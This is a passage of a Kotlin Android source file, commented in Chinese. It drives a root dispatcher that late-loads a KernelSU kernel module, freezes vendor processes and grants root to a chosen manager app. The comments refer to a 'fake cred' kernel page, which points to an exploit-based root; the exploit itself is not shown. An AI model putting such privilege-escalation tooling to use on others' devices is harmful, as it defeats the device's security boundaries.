            for t in ${'$'}(pidof louise 2>/dev/null) ${'$'}(pidof tpd_calib 2>/dev/null) ${'$'}(pidof timer98260 2>/dev/null); do kill -STOP ${'$'}t 2>/dev/null; done
        """.trimIndent() + "\n"

        val run = File(context.cacheDir, "late.sh")
        // 先清空并打开权限（0666）：root 批次从内核上下文写这个文件时不会被 DAC 挡住。
        runCatching {
            val f = statusFile()
            f.writeText("")
            f.setWritable(true, false)
            f.setReadable(true, false)
        }
        run.writeText(batch)
        if (!sh.push(run, "${Device.CHAN}/run")) {
            say("[X] 推送 late-load 脚本失败")
            return false
        }
        if (!wakeDispatcher()) say("[!] 唤醒 dispatcher 失败，仍继续等")

        // 等 root 批次把结论写进 App 自己的 filesDir——App 唯一稳定可读的位置。
        // 批次在 ksud 返回后自己最多等 30 秒模块注册，所以这里跟着等 40 秒，拿到结果立刻走。
        var tick = 0
        while (tick < 40) {
            tick++
            delay(1_000)
            if (readStatusLine().isNotEmpty()) break
        }
        val done = readStatusLine()
        if (done.isEmpty()) {
            say("[X] root 批次没有回报 ksud 结果")
            return false
        }
        say("    $done")
        val rc = rcOf(done)
        if (rc != null && rc != 0) {
            say("[X] ksud 返回 $rc")
            return false
        }
        return true
    }

    /**
     * 往 chan/wake 写一个字节叫醒 dispatcher。
     * dispatcher 自己用 O_RDWR 握着读端（见 root_dispatcher.sh），所以这里的写不会阻塞；
     * 万一 FIFO 不在（dispatcher 还没起/被冻住），写会超时失败，调用方按「失败也继续等」处理。
     */
    private suspend fun wakeDispatcher(): Boolean {
        val r = sh.exec(
            "echo x > ${Device.CHAN}/wake 2>/dev/null; echo WAKE_RC=$?",
            8_000,
        ).text
        return r.contains("WAKE_RC=0")
    }

    /**
     * 收尾：把 dispatcher 用 SIGSTOP 暂停（CPU 归零，但不退出）。
     * 不能 kill —— 它一退出，父进程 exe 的 waitpid 立刻返回并向内核释放 fake cred 页 → panic。
     * 这段脚本走 chan/run，由 root dispatcher 自己执行，因此有权限给自己发信号。
     */
    private suspend fun stopDispatcherNow() {
        val script = """
            SELF=${'$'}${'$'}
            for D in /proc/[0-9]*; do
              P=${'$'}{D#/proc/}
              [ "${'$'}P" = "${'$'}SELF" ] && continue
              C=${'$'}(tr '\0' ' ' < ${'$'}D/cmdline 2>/dev/null)
              case "${'$'}C" in
                *louise_cmd.sh*) kill -STOP ${'$'}P 2>/dev/null && echo STOPPED=${'$'}P ;;
              esac
            done
            echo STOP_DONE
        """.trimIndent() + "\n"
        val f = File(context.cacheDir, "stop.sh")
        f.writeText(script)
        if (!sh.push(f, "${Device.CHAN}/run")) {
            say("[!] 收尾脚本推送失败")
            return
        }
        wakeDispatcher()
        var done = false
        var t = 0
        while (!done && t < 20) {
            t++
            delay(500)
            done = sh.exec("grep -c STOP_DONE ${Device.LOG} 2>/dev/null", 5_000).text.trim().let { it.isNotEmpty() && it != "0" }
        }
        if (done) {
            val stopped = sh.exec("grep -o 'STOPPED=[0-9]*' ${Device.LOG} 2>/dev/null | tail -3", 5_000).text.trim()
            say("    dispatcher 已暂停 · ${stopped.ifEmpty { "无" }}")
        } else {
            say("[!] dispatcher 暂停未确认 · root 已生效")
        }
    }

    /**
     * 不经过 Shizuku 的本地执行：模块一进内核，Shizuku 通道会 binder 死等，
     * 用它读 /proc/modules 或日志，避免界面永远停在「正在缔结」。
     */
    private fun runLocal(cmd: String, waitMs: Long = 8_000): String = try {
        val p = ProcessBuilder("/system/bin/sh", "-c", cmd).redirectErrorStream(true).start()
        val sb = StringBuilder()
        val th = Thread { p.inputStream.bufferedReader().forEachLine { sb.appendLine(it) } }
        th.isDaemon = true
        th.start()
        if (!p.waitFor(waitMs, java.util.concurrent.TimeUnit.MILLISECONDS)) {
            p.destroyForcibly()
            ""
        } else {
            th.join(500)
            sb.toString()
        }
    } catch (e: Exception) {
        ""
    }

    /**
     * root 批次把模块行写进 App 自己的 filesDir（/data/user/0/<pkg>/files/ks_module）。
     * App 进程是 untrusted_app：读 /proc/modules 会被 SELinux 拒，读 /data/local/tmp 也不行，
     * 只有自己目录里的文件一定能读 —— 所以判定只看这个文件。
     */
    private fun statusFile(): File = File(context.filesDir, "ks_module")

    private fun readStatusLine(): String = RootFlow.readStatusLine(File(context.filesDir, "ks_module"))

    /** 只认 root 批次写下的那一行：模块行（Live/Loading），或 KS1_RC=<code> 完成记录。 */
    private fun bestModuleLine(): String = readStatusLine()

    /** 给界面用：完全不依赖 Shizuku/root，只读 root 批次留下的那一行。 */
    fun moduleLineNow(): String = bestModuleLine()

    /** 给界面用：只要 root 批次登记过结果就算已加载（Loading 也算）。 */
    fun moduleLoadedNow(): Boolean = readStatusLine().isNotEmpty()

    private fun rcOf(line: String): Int? =
        if (line.startsWith("KS1_RC=")) line.removePrefix("KS1_RC=").trim().toIntOrNull() else null

    // ------------------------------------------------------------------ 验证 / 授权

    /**
     * ksud 返回 0 就是这一步完成（实测模块是在返回之后才异步进内核的，
     * 批内 grep 只会得到 LOAD_HAS=0）。所以判定只看 root 批次写下的完成记录，
     * 不再反复查 /proc/modules。
     */
    private suspend fun verify(): Boolean {
        repeat(4) {
            val line = bestModuleLine()
            if (line.isNotEmpty()) {
                val rc = rcOf(line)
                if (rc == null) {
                    if (line.contains(" Live ")) say("    内核模块已加载（Live）")
                    else say("    已加载，正在转 Live：$line")
                    return true
                }
                if (rc == 0) {
                    say("    驱动已装好 · 内核已接住，直接收尾")
                    return true
                }
                say("[X] 验证失败 · ksud 返回 $rc")
                return false
            }
            delay(500)
        }
        say("[X] 验证失败 · root 批次没有回报结果")
        return false
    }

    /**
     * 把「主管理器」掰成用户选的那一个（尽力而为）。
     *
     * 背景：主管理器是 late-load 那一刻写进内核的，FinaSU 的 ksud 不会理会
     * `--package-name` 的改动（实测仍然留 me.yuki.fina）。所以真正的开关是两个：
     *   1. `ksud debug set-manager <APK>`：直接改主管理器，需要内核 CONFIG_KSU_DEBUG；
     *   2. `dynamic set-uid + grant`：把选中的管理器加进授权列表（这条一定有效）。
     * 这里先试 1，失败就交给后面的动态授权。
     */
    private suspend fun promotePrimary(): Boolean {
        val apk = sh.exec("pm path ${manager.pkg} 2>/dev/null | head -1 | cut -d: -f2", 20_000).stdout.trim()
        if (apk.isEmpty()) {
            say("    set-manager：找不到 APK 路径（跳过）")
            return false
        }
        val out = sh.exec("/system/bin/su -c '${managerKsud.ifEmpty { "/data/local/tmp/ksud" }} debug set-manager $apk' 2>&1", 60_000).text.trim()
        if (out.isNotEmpty()) say("    set-manager：${out.lineSequence().first()}")

        val cur = sh.exec("/system/bin/su -c '${managerKsud.ifEmpty { "/data/local/tmp/ksud" }} debug package 2>/dev/null'", 30_000).stdout.trim()
        say("    主管理器现在是：${cur.ifEmpty { "δ֪" }}")
        if (cur.contains(manager.pkg)) {
            say("    已把主管理器切成 ${manager.name}")
            return true
        }
        say("    内核拒绝 set-manager · 走动态授权")
        return false
    }

    /**
     * 只保留选中的那一个管理器。
     *
     * 关键：**绝不先 dynamic clear**。旧版顺序是「先清空再 set-uid」，
     * uid 一旦取不到就把授权清成 0 个，所有管理器直接失联。
     * 现在先确认 uid 拿得到，再去动列表；失败也不清空。
     */
    private suspend fun grantOnly(pkg: String): Boolean {
        say("[授权] 只保留 ${manager.name}")

        val others = Managers.ALL.map { it.pkg }.filter { it != pkg && it != "me.yuki.fina" }

        val script = buildString {
            appendLine("KS=${managerKsud.ifEmpty { "none" }}")
            appendLine("PL=/data/system/packages.list")
            appendLine("UID_=\$(grep \"^$pkg \" \$PL 2>/dev/null | head -1 | cut -d' ' -f2)")
            appendLine("if [ -z \"\$UID_\" ]; then echo NO_UID; exit 2; fi")
            appendLine("echo TARGET_UID=\$UID_")
            for (o in others) {
                appendLine("OU=\$(grep \"^$o \" \$PL 2>/dev/null | head -1 | cut -d' ' -f2)")
                appendLine("if [ -n \"\$OU\" ]; then \$KS dynamic ungrant \$OU 2>&1 | sed 's/^/UNGRANT: /'; fi")
            }
            appendLine("\$KS dynamic set-uid \$UID_ 2>&1 | sed 's/^/SET: /'")
            appendLine("\$KS dynamic grant \$UID_ 2>&1 | sed 's/^/GRANT: /'")
            appendLine("LIST=\$(\$KS dynamic list 2>/dev/null)")
            appendLine("echo \"\$LIST\" | sed 's/^/LIST: /'")
            appendLine("echo GRANT_RC=\$(echo \"\$LIST\" | grep -cE \"(^|[^0-9])\$UID_([^0-9]|`$\")\")")
        }

        val f = File(context.cacheDir, "grant.sh")
        f.writeText(script)

        if (!sh.push(f, "${Device.CHAN}/grant.sh")) {
            say("[X] 推送授权脚本失败")
            return false
        }
        if (!sh.isAvailable()) {
            say("[X] Shizuku 已断开，授权没做")
            return false
        }

        val out = sh.exec("/system/bin/su -c 'sh ${Device.CHAN}/grant.sh 2>&1'", 120_000).text
        out.lineSequence().filter { it.isNotBlank() }.forEach { say("    $it") }

        if (out.contains("NO_UID")) {
            say("[X] 查不到 $pkg 的 uid，未改动任何授权")
            return false
        }
        val hits = Regex("""GRANT_RC=(\d+)""").find(out)?.groupValues?.get(1)?.toIntOrNull() ?: 0
        if (hits < 1) {
            say("[X] 授权失败：列表里没有 $pkg（其他管理器保持原样，不会清空）")
            return false
        }
        say("    授权完成：${manager.name} 已在授权列表")
        return true
    }

    /**
     * 分发器体检：把 sh 的 PID / ״̬ / 1 秒内 CPU tick 增量 / 自愿切换次数写进日志。
     * 纯 Kotlin 侧解析 /proc，不在 shell 里拼变量，避免转义地狱。
     */
    suspend fun dispatcherReport(): String {
        val psOut = sh.exec("ps -A -o PID,ARGS", 15_000).stdout
        val line = psOut.lineSequence()
            .firstOrNull { it.contains("louise_cmd.sh") && !it.contains("grep") }
            ?: return "NO_DISPATCHER"
        val pid = line.trim().split(Regex("\\s+")).firstOrNull() ?: return "NO_DISPATCHER"

        val rawA = sh.exec("cat /proc/$pid/stat", 10_000).stdout.trim()
        if (rawA.isEmpty()) return "PID=$pid 已退出"
        val fa = rawA.split(" ")
        val stateA = fa.getOrNull(2) ?: "?"
        val cpuA = (fa.getOrNull(13)?.toLongOrNull() ?: 0L) + (fa.getOrNull(14)?.toLongOrNull() ?: 0L)
        val vtxA = sh.exec("cat /proc/$pid/status", 10_000).stdout.lineSequence()
            .firstOrNull { it.startsWith("voluntary_ctxt_switches") }
            ?.filter { it.isDigit() }?.toLongOrNull() ?: -1L

        delay(1_000)

        val rawB = sh.exec("cat /proc/$pid/stat", 10_000).stdout.trim()
        if (rawB.isEmpty()) return "PID=$pid 已退出"
        val fb = rawB.split(" ")
        val stateB = fb.getOrNull(2) ?: "?"
        val cpuB = (fb.getOrNull(13)?.toLongOrNull() ?: 0L) + (fb.getOrNull(14)?.toLongOrNull() ?: 0L)
        val vtxB = sh.exec("cat /proc/$pid/status", 10_000).stdout.lineSequence()
            .firstOrNull { it.startsWith("voluntary_ctxt_switches") }
            ?.filter { it.isDigit() }?.toLongOrNull() ?: -1L

        val dCpu = cpuB - cpuA
        return "PID=$pid STATE=$stateB CPU_1S=${dCpu}ticks VTX=$vtxA->$vtxB (was $stateA)"
    }

    companion object {
        /** 给界面用：不依赖 Shizuku/root，只读 root 批次写下的模块行。 */
        fun statusLineNow(context: Context): String = readStatusLine(File(context.filesDir, "ks_module"))

        /** 给界面用：批次记下的「这一次真正装进去的管理器包名」（PKG= 行）。 */
        fun statusPkgNow(context: Context): String =
            readStatusLine(File(context.filesDir, "ks_module"))
                .lineSequence().map { it.trim() }
                .firstOrNull { it.startsWith("PKG=") }
                ?.removePrefix("PKG=")?.trim().orEmpty()

        private fun readStatusLine(f: File): String {
            if (!f.isFile) return ""
            // 文件必须写于本次开机之后：开机时间 = now - uptime，留 60 秒时钟误差
            val bootWall = System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime()
            if (f.lastModified() < bootWall - 60_000) return ""
            return runCatching { f.readText().trim() }.getOrDefault("")
        }
    }
}
